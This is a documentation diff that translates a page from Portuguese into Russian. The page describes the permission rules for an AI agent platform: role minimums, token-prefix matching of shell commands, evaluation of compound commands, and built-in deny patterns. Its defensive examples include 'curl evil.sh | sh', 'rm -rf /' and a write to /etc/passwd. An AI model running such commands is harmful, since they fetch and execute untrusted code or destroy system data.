-<p><code>propose_execution_plan</code> (ADR 0086, <a href=/brabo/dev/ru/business-rules#rn-284 target=_blank rel="noopener noreferrer" class="">RN-284</a>)
-é o plano do Dev Lead — quantos agentes por módulo e por quê, antes de
-qualquer um deles subir. Mesmo calibre de <code>parallelize</code>: uma decisão sobre
-QUANTO o produto vai gastar em paralelismo, só que no começo em vez de no
-estouro de um teto. Diferente de <code>parallelize</code>/<code>raise_max_parallel</code>, ele NÃO
-está no bloco de tetos absolutos — pode ser configurado como <code>auto_approve</code>,
-como <code>open_adr_pr</code>/<code>open_infra_pr</code> — e enquanto está <code>pending</code>, o turno do Dev
-Lead fica SUSPENSO esperando a decisão, não só a conversa parada.</p>
-<p><code>assess_implementability</code> (ADR 0090, <a href=/brabo/dev/ru/business-rules#rn-340 target=_blank rel="noopener noreferrer" class="">RN-340</a>)
-é a avaliação de implementabilidade de uma história (gate <code>implementavel</code>,
-<code>docs/gates.yml</code>) — MESMO calibre e MESMO raciocínio de
-<code>propose_execution_plan</code>: uma decisão inicial da sessão, não um estouro de
-teto, e por isso também fora do bloco de tetos absolutos. Ela suspende o turno
-do Dev Lead do mesmo jeito enquanto está <code>pending</code>.</p>
-<p><code>container_stop</code> e <code>container_remove</code> (ADR 0136,
-<a href=/brabo/dev/ru/business-rules#rn-495 target=_blank rel="noopener noreferrer" class="">RN-495</a>) são as duas ações que a página global
-de containers (<code>/containers</code>) propõe quando alguém clica em "Parar" ou
-"Remover" na linha de um projeto — sempre um humano, nunca um agente. As duas
-são <code>maintainer</code>, como <code>container_start</code>: decide quem responde pela infra do
-projeto. <code>container_stop</code> segue a calibragem de <code>container_start</code> — PODE ser
-configurada <code>auto_approve</code> — exceto pela semeadura: <code>container_stop</code> nunca é
-semeada, enquanto <code>container_start</code> é semeada <code>auto_approve</code> para o agente de
-Infra quando o handoff dele é aceito (ADR 0190,
-<a href=/brabo/dev/ru/business-rules#rn-671 target=_blank rel="noopener noreferrer" class="">RN-671</a>). É essa semeadura que deixa a subida
-que o SERVIDOR do Infra Lead propõe nesse aceite rodar sem um segundo clique;
-o mínimo <code>maintainer</code>, as recusas por modo/estado e o 409 sem broker continuam
-valendo antes dela.
-<code>container_remove</code> não pode: ela descarta o container e força um
-reprovisionamento completo, e está no bloco de tetos absolutos abaixo, mesmo
-tratamento de git com efeito externo/comandos privilegiados.</p>
-<p><strong>Nenhuma das três se importa com ONDE o container sobe.</strong> <code>decide()</code> e todas
-as regras acima ignoram o <code>executionMode</code> — a ramificação só existe na
-EXECUÇÃO, depois da aprovação (<code>ExecuteContainerStartUseCase</code>/
-<code>ExecuteContainerStopUseCase</code>/<code>ExecuteContainerRemoveUseCase</code>): a ação
-aprovada de um projeto <code>container</code> continua indo para o broker
-(<code>ContainerBrokerPort</code>, sem mudança); a de um projeto <code>mounted</code>/<code>runner</code> vai,
-em vez disso, para o RUNNER conectado ao projeto, pelo canal Phoenix que ele
-já mantém (<a href=/brabo/dev/ru/business-rules#rn-497 target=_blank rel="noopener noreferrer" class="">RN-497</a>,
-<a href=/brabo/dev/ru/adr/0137-o-runner-sobe-o-container-do-projeto target=_blank rel="noopener noreferrer" class="">ADR 0137</a>). "Nenhum
-runner conectado" e "o runner tentou e recusou" são os dois desfechos <code>failed</code>
-comuns, mesma disciplina de uma recusa do broker — nunca uma exceção não
-tratada.</p>
-<p><strong>Mais uma coisa acontece na execução de <code>container_start</code>, e só em
-<code>mounted</code></strong> (<a href=/brabo/dev/ru/business-rules#rn-501 target=_blank rel="noopener noreferrer" class="">RN-501</a>,
-<a href=/brabo/dev/ru/adr/0142-validacao-de-workspace-montado-adiada target=_blank rel="noopener noreferrer" class="">ADR 0142</a>): a pasta do
-projeto é MATERIALIZADA ali. Criar um projeto <code>mounted</code> não exige mais que a
-pasta exista — a criação valida só o formato do caminho mais a
-<code>BRABO_PROJECTS_BASE</code> — porque o requisito do dono do produto é que o
-bind-mount seja criado DEPOIS da decisão do Arquiteto, e <code>container_start</code> é o
-primeiro momento que se qualifica. Então o executor faz <code>mkdir -p</code> da pasta,
-prova que ela é gravável de dentro da api e carimba <code>workspace_verified_at</code>,
-tudo ANTES de qualquer transição de ciclo de vida. Uma pasta que a api não
-consegue criar ou alcançar é um <code>failed</code> NOMEADO — nomeia a variável, o
-caminho, a causa provável (dono da pasta no host; as imagens rodam
-non-root, ADR 0024) e o próximo passo — e a linha do ciclo de vida <strong>não</strong> é
-marcada <code>provisioning</code>: marcá-la e só então descobrir que não dá para escrever
-deixaria <code>project_containers</code> afirmando um estado que nunca existiu. Nada disso
-toca <code>decide()</code>, os tetos ou quem pode aprovar.</p>
-<p><strong>E <code>container_start</code> resolve os recursos dele ali</strong>
-(<a href=/brabo/dev/ru/business-rules#rn-683 target=_blank rel="noopener noreferrer" class="">RN-683</a>,
-<a href=/brabo/dev/ru/adr/0199-recurso-minimo-derivado-do-module-map target=_blank rel="noopener noreferrer" class="">ADR 0199</a>): um campo
-que a proposta OMITE — todos, na subida do servidor no aceite do handoff —
-vira o MÍNIMO derivado do <code>module_map</code> vigente (a soma do que cada módulo
-declarou, com piso no padrão de hoje enquanto algum módulo não declarou nada);
-um campo ABAIXO desse mínimo é um <code>failed</code> nomeado, gravado antes de qualquer
-decisão de imagem ou transição de ciclo de vida; acima dele, vale o teto de
-sempre. Como a materialização da pasta, isto é execução, não política:
-<code>decide()</code> e quem pode aprovar não mudam.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=como-um-padrão-casa-com-um-comando>Como um padrão casa com um comando<a href=#como-um-padrão-casa-com-um-comando class=hash-link aria-label="Прямая ссылка на Como um padrão casa com um comando" title="Прямая ссылка на Como um padrão casa com um comando" translate=no>​</a></h2>
-<p>Não por substring. O comando é tokenizado com as regras do shell e o padrão
-casa por <strong>prefixo de token</strong>:</p>
+<table><thead><tr><th>тип действия<th>метка<th>минимальная роль<tbody><tr><td><code>terminal</code><td><code>Terminal</code><td>developer<tr><td><code>git_commit</code><td><code>GitCommit</code><td>developer<tr><td><code>write_file</code><td><code>WriteFile</code><td>developer<tr><td><code>git_push</code><td><code>GitPush</code><td>maintainer<tr><td><code>pr_open</code><td><code>PrOpen</code><td>maintainer<tr><td><code>git_repo_create</code><td><code>GitRepoCreate</code><td>maintainer<tr><td><code>git_branch_create</code><td><code>GitBranchCreate</code><td>maintainer<tr><td><code>git_branch_protect</code><td><code>GitBranchProtect</code><td>maintainer<tr><td><code>open_adr_pr</code><td><code>OpenAdrPr</code><td>maintainer<tr><td><code>open_infra_pr</code><td><code>OpenInfraPr</code><td>maintainer<tr><td><code>git_merge</code><td><code>GitMerge</code><td>maintainer<tr><td><code>instruction_patch</code><td><code>InstructionPatch</code><td>maintainer<tr><td><code>parallelize</code><td><code>Parallelize</code><td>maintainer<tr><td><code>raise_max_parallel</code><td><code>RaiseMaxParallel</code><td>maintainer<tr><td><code>propose_execution_plan</code><td><code>ProposeExecutionPlan</code><td>maintainer<tr><td><code>assess_implementability</code><td><code>AssessImplementability</code><td>maintainer<tr><td><code>container_start</code><td><code>ContainerStart</code><td>maintainer<tr><td><code>container_stop</code><td><code>ContainerStop</code><td>maintainer<tr><td><code>container_remove</code><td><code>ContainerRemove</code><td>maintainer<tr><td><code>spend</code><td><code>Spend</code><td><strong>owner</strong></table>
+<p>Минимальная роль проверяется <strong>до</strong> файла. Без неё — <code>deny</code>:
+<code>permissions.json</code> не даёт того, что запрещает IAM</p>
+<p><code>parallelize</code> (Фаза 14d) — единственное, чей эффект не касается кода или
+репозитория: оно запрашивает больше АГЕНТОВ. Оно на уровне <code>maintainer</code> по той
+же причине, что и <code>spend</code>, — расходы разрешает тот, кто отвечает за проект. Оно
+существует только выше предела лида; внутри него действия нет, потому что
+решать нечего
+(<a class="" href=/brabo/dev/ru/business-rules/custo#rn-083>RN-083</a>)
+(<a class="" href=/brabo/dev/ru/business-rules#rn-005>RN-005</a>).</p>
+<p><code>propose_execution_plan</code> (ADR 0086, <a class="" href=/brabo/dev/ru/business-rules#rn-284>RN-284</a>)
+— это план Dev Lead: сколько агентов на модуль и почему, до того как
+поднимется хоть один. Тот же калибр, что у <code>parallelize</code>: решение о том,
+СКОЛЬКО продукт потратит на параллелизм, только в начале, а не при превышении
+предела. В отличие от <code>parallelize</code>/<code>raise_max_parallel</code>, оно НЕ входит в блок
+абсолютных пределов — его можно настроить как <code>auto_approve</code>, как
+<code>open_adr_pr</code>/<code>open_infra_pr</code>, — и пока оно <code>pending</code>, ход Dev Lead
+ПРИОСТАНОВЛЕН в ожидании решения, а не просто разговор стоит.</p>
+<p><code>assess_implementability</code> (ADR 0090, <a class="" href=/brabo/dev/ru/business-rules#rn-340>RN-340</a>)
+— это оценка реализуемости истории (гейт <code>implementavel</code>,
+<code>docs/gates.yml</code>) — ТОТ ЖЕ калибр и ТО ЖЕ рассуждение, что у
+<code>propose_execution_plan</code>: начальное решение сессии, а не превышение предела, и
+поэтому тоже вне блока абсолютных пределов. Оно так же приостанавливает ход
+Dev Lead, пока находится в <code>pending</code>.</p>
+<p><code>container_stop</code> и <code>container_remove</code> (ADR 0136,
+<a class="" href=/brabo/dev/ru/business-rules#rn-495>RN-495</a>) — два действия, которые глобальная
+страница контейнеров (<code>/containers</code>) предлагает, когда кто-то нажимает
+«Остановить» или «Удалить» в строке проекта, — всегда человек, никогда агент.
+Оба — <code>maintainer</code>, как <code>container_start</code>: решает тот, кто отвечает за
+инфраструктуру проекта. <code>container_stop</code> следует калибровке <code>container_start</code> —
+его МОЖНО настроить как <code>auto_approve</code>, — за исключением посева:
+<code>container_stop</code> никогда не засевается, тогда как <code>container_start</code> засевается
+как <code>auto_approve</code> для агента Infra, когда его handoff принят (ADR 0190,
+<a class="" href=/brabo/dev/ru/business-rules#rn-671>RN-671</a>). Именно этот посев позволяет подъёму,
+который СЕРВЕР Infra Lead предлагает при этом принятии, пройти без второго
+нажатия; минимум <code>maintainer</code>, отказы по режиму/состоянию и 409 без broker
+по-прежнему действуют до него.
+<code>container_remove</code> так нельзя: он уничтожает контейнер и вынуждает полное
+повторное развёртывание, и он находится в блоке абсолютных пределов ниже, с тем
+же отношением, что и git с внешним эффектом/привилегированные команды.</p>
+<p><strong>Ни одному из трёх не важно, ГДЕ поднимается контейнер.</strong> <code>decide()</code> и все
+правила выше игнорируют <code>executionMode</code> — ветвление существует только при
+ВЫПОЛНЕНИИ, после одобрения (<code>ExecuteContainerStartUseCase</code>/
+<code>ExecuteContainerStopUseCase</code>/<code>ExecuteContainerRemoveUseCase</code>): одобренное
+действие проекта <code>container</code> по-прежнему идёт в broker
+(<code>ContainerBrokerPort</code>, без изменений); действие проекта <code>mounted</code>/<code>runner</code>
+идёт вместо этого в RUNNER, подключённый к проекту, по каналу Phoenix, который
+он уже поддерживает (<a class="" href=/brabo/dev/ru/business-rules#rn-497>RN-497</a>,
+<a class="" href=/brabo/dev/ru/adr/0137-o-runner-sobe-o-container-do-projeto>ADR 0137</a>). «Нет
+подключённого runner» и «runner попытался и отказал» — два обычных исхода
+<code>failed</code>, та же дисциплина, что и при отказе broker, — никогда не
+необработанное исключение.</p>
+<p><strong>При выполнении <code>container_start</code> происходит ещё одно, и только в
+<code>mounted</code></strong> (<a class="" href=/brabo/dev/ru/business-rules#rn-501>RN-501</a>,
+<a class="" href=/brabo/dev/ru/adr/0142-validacao-de-workspace-montado-adiada>ADR 0142</a>): папка
+проекта там МАТЕРИАЛИЗУЕТСЯ. Создание проекта <code>mounted</code> больше не требует,
+чтобы папка существовала, — создание проверяет только формат пути плюс
+<code>BRABO_PROJECTS_BASE</code>, — потому что требование владельца продукта состоит в
+том, чтобы bind-mount создавался ПОСЛЕ решения Архитектора, а <code>container_start</code>
+— первый подходящий момент. Поэтому исполнитель делает <code>mkdir -p</code> папки,
+доказывает, что она доступна для записи изнутри api, и ставит отметку
+<code>workspace_verified_at</code> — всё ДО любого перехода жизненного цикла. Папка,
+которую api не может создать или достичь, — это ИМЕНОВАННЫЙ <code>failed</code>: он
+называет переменную, путь, вероятную причину (владелец папки на хосте; образы
+работают non-root, ADR 0024) и следующий шаг, — и строка жизненного цикла <strong>не</strong>
+помечается <code>provisioning</code>: пометить её и только потом обнаружить, что писать
+нельзя, означало бы оставить <code>project_containers</code> утверждающим состояние,
+которого никогда не было. Ничто из этого не затрагивает <code>decide()</code>, пределы или
+то, кто может одобрять.</p>
+<p><strong>И <code>container_start</code> разрешает там свои ресурсы</strong>
+(<a class="" href=/brabo/dev/ru/business-rules#rn-683>RN-683</a>,
+<a class="" href=/brabo/dev/ru/adr/0199-recurso-minimo-derivado-do-module-map>ADR 0199</a>): поле,
+которое предложение ОПУСКАЕТ, — все поля при подъёме сервером при принятии
+handoff, — становится МИНИМУМОМ, выведенным из действующего <code>module_map</code> (сумма
+того, что объявил каждый модуль, с нижней границей в сегодняшнем значении по
+умолчанию, пока какой-то модуль ничего не объявил); поле НИЖЕ этого минимума —
+именованный <code>failed</code>, записываемый до любого решения об образе или перехода
+жизненного цикла; выше него действует обычный предел. Как и материализация
+папки, это выполнение, а не политика: <code>decide()</code> и то, кто может одобрять, не
+меняются.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=как-шаблон-сопоставляется-с-командой>Как шаблон сопоставляется с командой<a href=#как-шаблон-сопоставляется-с-командой class=hash-link aria-label="Прямая ссылка на Как шаблон сопоставляется с командой" title="Прямая ссылка на Как шаблон сопоставляется с командой" translate=no>​</a></h2>
+<p>Не по подстроке. Команда разбивается на токены по правилам shell, и шаблон
+совпадает по <strong>префиксу токенов</strong>:</p>
 
 
 
@@ -276,334 +280,344 @@ casa por <strong>prefixo de token</strong>:</p>
 
 
 
-<table><thead><tr><th>padrão<th>comando<th>casa?<tbody><tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test</code><td>✅<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test --watch</code><td>✅ (prefixo)<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm build</code><td>❌<tr><td><code>Terminal(pnpm test:*)</code><td><code>pnpm test:unit</code><td>✅ (<code>*</code> no fim do token)<tr><td><code>Terminal(rm)</code><td><code>sudo rm -rf x</code><td>❌ — <code>rm</code> não é o primeiro token</table>
-<p>O <code>*</code> vale <strong>dentro de um token</strong>, no fim. Não é glob de caminho:
-<code>Terminal(rm -rf /*)</code> casa com o token literal <code>/*</code>, não com "qualquer coisa
-abaixo de <code>/</code>".</p>
-<p>Variáveis de ambiente são preservadas literalmente: <code>$HOME</code> continua <code>$HOME</code>
-no casamento, em vez de expandir para vazio — expandir mudaria em silêncio o
-que está sendo comparado.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=comando-composto>Comando composto<a href=#comando-composto class=hash-link aria-label="Прямая ссылка на Comando composto" title="Прямая ссылка на Comando composto" translate=no>​</a></h2>
-<p>Um comando com <code>&&</code>, <code>;</code>, <code>|</code>, <code>||</code> ou <code>&</code> é dividido em segmentos, e <strong>cada
-segmento é avaliado separadamente</strong>:</p>
+<table><thead><tr><th>шаблон<th>команда<th>совпадает?<tbody><tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test</code><td>✅<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm test --watch</code><td>✅ (префикс)<tr><td><code>Terminal(pnpm test)</code><td><code>pnpm build</code><td>❌<tr><td><code>Terminal(pnpm test:*)</code><td><code>pnpm test:unit</code><td>✅ (<code>*</code> в конце токена)<tr><td><code>Terminal(rm)</code><td><code>sudo rm -rf x</code><td>❌ — <code>rm</code> не первый токен</table>
+<p><code>*</code> действует <strong>внутри токена</strong>, в конце. Это не glob путей:
+<code>Terminal(rm -rf /*)</code> совпадает с буквальным токеном <code>/*</code>, а не с «чем угодно
+ниже <code>/</code>».</p>
+<p>Переменные окружения сохраняются буквально: <code>$HOME</code> остаётся <code>$HOME</code> при
+сопоставлении, вместо того чтобы раскрыться в пустоту, — раскрытие молча
+изменило бы то, что сравнивается.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=составная-команда>Составная команда<a href=#составная-команда class=hash-link aria-label="Прямая ссылка на Составная команда" title="Прямая ссылка на Составная команда" translate=no>​</a></h2>
+<p>Команда с <code>&&</code>, <code>;</code>, <code>|</code>, <code>||</code> или <code>&</code> разбивается на сегменты, и <strong>каждый
+сегмент оценивается отдельно</strong>:</p>
 <ul>
-<li class="">Qualquer segmento em <code>deny</code> → o comando inteiro é <code>deny</code>.</li>
-<li class=""><strong>Todos</strong> os segmentos em <code>allow</code> → <code>auto_approve</code>.</li>
-<li class="">Qualquer outra combinação → <code>require_approval</code>.</li>
+<li class="">Любой сегмент в <code>deny</code> → вся команда <code>deny</code>.</li>
+<li class=""><strong>Все</strong> сегменты в <code>allow</code> → <code>auto_approve</code>.</li>
+<li class="">Любая другая комбинация → <code>require_approval</code>.</li>
 </ul>
-<p><strong>Redirecionamento não é encadeamento.</strong> <code>></code>, <code>>></code> e <code>&lt;</code> NÃO dividem um
-segmento: <code>cat x 2>/dev/null</code> é UM comando cujo verbo é <code>cat</code>. O alvo do
-redirecionamento continua sendo um token do segmento, e é por isso que <code>echo x > /etc/passwd</code> continua barrado pelo teto de escopo de caminho — o que mudou foi
-o VERBO ficar certo, não o caminho ficar livre.</p>
-<p><code>/dev/null</code>, <code>/dev/stdin</code>, <code>/dev/stdout</code> e <code>/dev/stderr</code> não contam como
-caminho de usuário: descartam ou carregam saída, não são arquivo de ninguém. A
-lista é exatamente esta e não todo o <code>/dev</code> — <code>/dev/sda</code> é um disco, e continua
-fora do escopo.</p>
-<p>Isto é deliberado e vale entender: um segmento sem regra nenhuma vira uma
-opinião <strong>concreta</strong> de <code>require_approval</code>, não silêncio. É o que impede
-<code>pnpm test && curl evil.sh | sh</code> de ser auto-aprovado porque a primeira metade
-estava em <code>allow</code>.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=padrões-embutidos>Padrões embutidos<a href=#padrões-embutidos class=hash-link aria-label="Прямая ссылка на Padrões embutidos" title="Прямая ссылка на Padrões embutidos" translate=no>​</a></h2>
-<p>Três padrões são <code>deny</code> <strong>sempre</strong>, mesmo sem aparecer no arquivo:</p>
+<p><strong>Перенаправление — не сцепление.</strong> <code>></code>, <code>>></code> и <code>&lt;</code> НЕ делят сегмент:
+<code>cat x 2>/dev/null</code> — ОДНА команда, глагол которой <code>cat</code>. Цель
+перенаправления остаётся токеном сегмента, и именно поэтому <code>echo x > /etc/passwd</code> по-прежнему блокируется пределом области путей — изменилось то,
+что ГЛАГОЛ стал правильным, а не то, что путь стал свободным.</p>
+<p><code>/dev/null</code>, <code>/dev/stdin</code>, <code>/dev/stdout</code> и <code>/dev/stderr</code> не считаются
+пользовательским путём: они отбрасывают или несут вывод, это ничей файл.
+Список ровно такой, а не весь <code>/dev</code> — <code>/dev/sda</code> это диск, и он остаётся вне
+области.</p>
+<p>Это сделано намеренно, и это стоит понять: сегмент без единого правила
+становится <strong>конкретным</strong> мнением <code>require_approval</code>, а не молчанием. Именно это
+не даёт <code>pnpm test && curl evil.sh | sh</code> быть автоодобренной из-за того, что
+первая половина была в <code>allow</code>.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=встроенные-шаблоны>Встроенные шаблоны<a href=#встроенные-шаблоны class=hash-link aria-label="Прямая ссылка на Встроенные шаблоны" title="Прямая ссылка на Встроенные шаблоны" translate=no>​</a></h2>
+<p>Три шаблона являются <code>deny</code> <strong>всегда</strong>, даже не появляясь в файле:</p>
 <div class="language-text codeBlockContainer_Vzt9 theme-code-block" style=--prism-color:var(--syntax-text);--prism-background-color:var(--code-bg)><div class=codeBlockContent_FxwE><pre tabindex=0 class="prism-code language-text codeBlock_mqej thin-scrollbar" style=color:var(--syntax-text);background-color:var(--code-bg)><code class=codeBlockLines_uNqR><div class=token-line style=color:var(--syntax-text)><span class="token plain">Terminal(rm -rf /)</span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain">Terminal(rm -rf /*)</span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain">Terminal(rm -fr /)</span><br/></div></code></pre></div></div>
-<p>Eles não são uma lista de segurança abrangente — são um piso. A proteção real
-vem de o <code>allow</code> ser explícito e todo o resto cair em aprovação.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=o-que-a-ativação-da-execução-semeia>O que a ativação da execução semeia<a href=#o-que-a-ativação-da-execução-semeia class=hash-link aria-label="Прямая ссылка на O que a ativação da execução semeia" title="Прямая ссылка на O que a ativação da execução semeia" translate=no>​</a></h2>
-<p>Ativar a execução grava os padrões de <code>DEV_TERMINAL_ALLOW_PATTERNS</code>
-(<code>apps/api/src/domain/actions/dev-terminal-patterns.ts</code>) no <code>allow</code> do
-projeto. São duas famílias:</p>
+<p>Это не исчерпывающий список безопасности — это нижняя граница. Настоящая
+защита в том, что <code>allow</code> явный, а всё остальное уходит на одобрение.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=что-засевает-активация-исполнения>Что засевает активация исполнения<a href=#что-засевает-активация-исполнения class=hash-link aria-label="Прямая ссылка на Что засевает активация исполнения" title="Прямая ссылка на Что засевает активация исполнения" translate=no>​</a></h2>
+<p>Активация исполнения записывает шаблоны из <code>DEV_TERMINAL_ALLOW_PATTERNS</code>
+(<code>apps/api/src/domain/actions/dev-terminal-patterns.ts</code>) в <code>allow</code>
+проекта. Это два семейства:</p>
 <ul>
-<li class=""><strong>leitura do próprio worktree</strong> — <code>ls</code>, <code>pwd</code>, <code>find</code>, <code>cat</code>, <code>head</code>,
+<li class=""><strong>чтение собственного worktree</strong> — <code>ls</code>, <code>pwd</code>, <code>find</code>, <code>cat</code>, <code>head</code>,
 <code>tail</code>, <code>grep</code>, <code>wc</code>, <code>echo</code>, <code>git status</code>, <code>git diff</code>, <code>git log</code>;</li>
-<li class=""><strong>leitura de histórico/remoto/config do git</strong> — <code>git branch -a/-r/-v/--list/--show-current</code>, <code>git remote -v</code>, <code>git remote show</code>, <code>git worktree list</code>, <code>git show</code>, <code>git for-each-ref</code>, <code>git ls-tree</code>, <code>git rev-parse</code>, <code>git config --get</code> (veja a <a href=/brabo/dev/ru/business-rules/custo#rn-143 target=_blank rel="noopener noreferrer" class="">RN-143</a>);</li>
-<li class=""><strong>build e teste</strong> — <code>pnpm install</code>, <code>pnpm test</code>, <code>npm run</code>, <code>npx vitest</code>, <code>mix test</code>, <code>pytest</code>, <code>go test</code>, <code>cargo test</code>, entre outros.</li>
+<li class=""><strong>чтение истории/удалённых/конфигурации git</strong> — <code>git branch -a/-r/-v/--list/--show-current</code>, <code>git remote -v</code>, <code>git remote show</code>, <code>git worktree list</code>, <code>git show</code>, <code>git for-each-ref</code>, <code>git ls-tree</code>, <code>git rev-parse</code>, <code>git config --get</code> (см. <a class="" href=/brabo/dev/ru/business-rules/custo#rn-143>RN-143</a>);</li>
+<li class=""><strong>сборка и тесты</strong> — <code>pnpm install</code>, <code>pnpm test</code>, <code>npm run</code>, <code>npx vitest</code>, <code>mix test</code>, <code>pytest</code>, <code>go test</code>, <code>cargo test</code> и другие.</li>
 </ul>
-<p>A terceira família existe porque o <code>ReportDone</code> só deixa abrir PR depois de um
-<code>terminal</code> com <code>exit 0</code> no histórico. A primeira existe porque o agente
-<strong>olha antes de construir</strong>: sem ela, todo <code>ls -la</code> num repositório recém
-provisionado caía em aprovação, voltava como <code>status pending</code> — e não como a
-saída do comando — e queimava uma iteração do ToolLoop até a tarefa morrer por
-limite (veja a <a href=/brabo/dev/ru/business-rules/custo#rn-068 target=_blank rel="noopener noreferrer" class="">RN-068</a>). A segunda existe
-porque <code>git status</code>/<code>diff</code>/<code>log</code> bastam para olhar o worktree, mas não para o
-agente se orientar no histórico e nos remotos de um repositório recém adotado
-— uma sessão real gastou dezenas de aprovações manuais em subcomandos como
-<code>git branch -a</code> ou <code>git worktree list</code> que ficavam fora do <code>allow</code> e
-empurravam para aprovação manual todo comando composto em que apareciam.</p>
-<p>Isto NÃO afrouxa nada do que está descrito acima. Continua valendo que <code>deny</code>
-vence <code>allow</code>, que os padrões embutidos seguem ativos, que o casamento é por
-prefixo de <strong>token</strong> (<code>ls</code> permitido não permite <code>lsof</code>), e que um comando
-composto exige que TODO segmento case — então <code>ls && rm -rf /</code> não passa por
-causa do <code>ls</code>.</p>
-<p>A segunda família exige cuidado a mais, porque o casamento por prefixo permite
-QUALQUER coisa depois do prefixo que casou: um padrão nu <code>Terminal(git branch)</code> casaria tanto com <code>git branch -D nome</code> (apaga) quanto com <code>git branch nome-nova</code> (cria) além da listagem simples, porque não enxerga o que vem
-depois. Por isso <code>branch</code>, <code>remote</code>, <code>worktree</code> e <code>config</code> — os quatro que têm
-um irmão que MUTA — só entraram ANCORADOS pela flag que torna a leitura
-inequívoca (<code>-a</code>/<code>-v</code>/<code>show</code>/<code>list</code>/<code>--get</code>), nunca pelo verbo nu;
+<p>Третье семейство существует, потому что <code>ReportDone</code> позволяет открыть PR
+только после <code>terminal</code> с <code>exit 0</code> в истории. Первое существует, потому что
+агент <strong>смотрит, прежде чем строить</strong>: без него каждый <code>ls -la</code> в только что
+развёрнутом репозитории уходил на одобрение, возвращался как <code>status pending</code> —
+а не как вывод команды — и сжигал итерацию ToolLoop, пока задача не умирала по
+лимиту (см. <a class="" href=/brabo/dev/ru/business-rules/custo#rn-068>RN-068</a>). Второе существует,
+потому что <code>git status</code>/<code>diff</code>/<code>log</code> достаточно, чтобы посмотреть на worktree,
+но не чтобы агент сориентировался в истории и удалённых репозиториях только
+что принятого репозитория, — реальная сессия потратила десятки ручных
+одобрений на подкоманды вроде <code>git branch -a</code> или <code>git worktree list</code>, которые
+были вне <code>allow</code> и отправляли на ручное одобрение каждую составную команду, в
+которой они встречались.</p>
+<p>Это НИЧЕГО не ослабляет из описанного выше. По-прежнему действует то, что <code>deny</code>
+побеждает <code>allow</code>, что встроенные шаблоны остаются активными, что сопоставление
+идёт по префиксу <strong>токенов</strong> (разрешённый <code>ls</code> не разрешает <code>lsof</code>) и что
+составная команда требует совпадения КАЖДОГО сегмента, — поэтому <code>ls && rm -rf /</code>
+не проходит из-за <code>ls</code>.</p>
+<p>Второе семейство требует дополнительной осторожности, потому что сопоставление
+по префиксу допускает ЧТО УГОДНО после совпавшего префикса: голый шаблон
+<code>Terminal(git branch)</code> совпал бы и с <code>git branch -D nome</code> (удаляет), и с
+<code>git branch nome-nova</code> (создаёт), помимо простого листинга, потому что не видит,
+что идёт дальше. Поэтому <code>branch</code>, <code>remote</code>, <code>worktree</code> и <code>config</code> — четыре, у
+которых есть ИЗМЕНЯЮЩИЙ брат, — вошли только ПРИВЯЗАННЫМИ к флагу, делающему
+чтение однозначным (<code>-a</code>/<code>-v</code>/<code>show</code>/<code>list</code>/<code>--get</code>), никогда голым глаголом;
 <code>git branch -D/-d/-m/-M</code>, <code>git remote add/remove/set-url</code>,
-<code>git worktree add/remove/prune</code> e <code>git config &lt;chave> &lt;valor></code> (sem <code>--get</code>)
-continuam exigindo aprovação. <code>show</code>, <code>log</code>, <code>for-each-ref</code>, <code>ls-tree</code> e
-<code>rev-parse</code> não precisaram de âncora: nenhuma continuação deles muta o
-repositório.</p>
-<p>Auto-aprovar <code>terminal</code> via <code>agent_autonomy</code> seria diferente e não é o que se
-faz: liberaria QUALQUER comando dentro do container do engine, sem arquivo no
-meio.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=a-ordem-completa-da-decisão>A ordem completa da decisão<a href=#a-ordem-completa-da-decisão class=hash-link aria-label="Прямая ссылка на A ordem completa da decisão" title="Прямая ссылка на A ordem completa da decisão" translate=no>​</a></h2>
+<code>git worktree add/remove/prune</code> и <code>git config &lt;ключ> &lt;значение></code> (без <code>--get</code>)
+по-прежнему требуют одобрения. <code>show</code>, <code>log</code>, <code>for-each-ref</code>, <code>ls-tree</code> и
+<code>rev-parse</code> не нуждались в привязке: ни одно их продолжение не изменяет
+репозиторий.</p>
+<p>Автоодобрение <code>terminal</code> через <code>agent_autonomy</code> было бы другим, и так не
+делается: оно разрешило бы ЛЮБУЮ команду внутри контейнера engine, без файла
+посередине.</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=полный-порядок-решения>Полный порядок решения<a href=#полный-порядок-решения class=hash-link aria-label="Прямая ссылка на Полный порядок решения" title="Прямая ссылка на Полный порядок решения" translate=no>​</a></h2>
 <!-- -->
-<p><strong>O nó <code>Z</code> mudou de posição</strong> (<a href=/brabo/dev/ru/business-rules#rn-418 target=_blank rel="noopener noreferrer" class="">RN-418</a>, revisa
-a <a href=/brabo/dev/ru/business-rules/autenticacao#rn-106 target=_blank rel="noopener noreferrer" class="">RN-106</a>): até a chegada do
-runner local, ele ficava logo depois do IAM e devolvia <code>deny</code> — agora é um
-TETO, no mesmo bloco final dos outros três, aplicado depois de
-<code>agent_autonomy</code> e <code>permissions.json</code> já terem opinado. Veja a seção
-<a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class="">"A fronteira de efeito externo e comando privilegiado"</a>
-abaixo para o porquê.</p>
-<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=modo-automático-a-curinga-do-agent_autonomy-rn-153>"Modo automático": a curinga do <code>agent_autonomy</code> (<a href=/brabo/dev/ru/business-rules/autenticacao#rn-153 target=_blank rel="noopener noreferrer" class="">RN-153</a>)<a href=#modo-automático-a-curinga-do-agent_autonomy-rn-153 class=hash-link aria-label="Прямая ссылка на modo-automático-a-curinga-do-agent_autonomy-rn-153" title="Прямая ссылка на modo-automático-a-curinga-do-agent_autonomy-rn-153" translate=no>​</a></h3>
-<p>O nó <code>agent_autonomy tem opinião?</code> do diagrama acima não sabe, e não precisa
